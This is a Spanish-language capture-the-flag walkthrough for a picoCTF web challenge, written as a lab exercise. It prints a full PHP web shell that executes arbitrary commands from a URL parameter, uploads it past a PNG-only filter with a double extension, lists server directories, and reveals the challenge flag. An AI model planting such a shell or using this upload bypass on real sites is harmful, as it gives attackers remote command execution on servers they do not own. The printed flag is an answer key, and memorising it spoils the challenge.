#### Description
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.


#### Hints
1. none


#### Solucion
1. Ingresamos al sitio web
2. Inspeccionamos y analizamos código
3. Ingresamos al navegador y colocamos "php webshell" --> https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985 y copiamos el codigo que se encuentra ahi
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
guardamos el archivo como "untitled.png.php" y lo subimos al sitio web que nos da el reto.

4. Cargamos el archivo
5. En la barra donde se encuentra el enlace escribimos "http://atlas.picoctf.net:62972/uploads/untitled.png.php"
6. ls -al /
7. ls -al /root
8.  ls -al /var/www/htm
9. cat /var/www/html/MFRDAZLDMUYDG.txt
10. Nos da la bandera --> picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}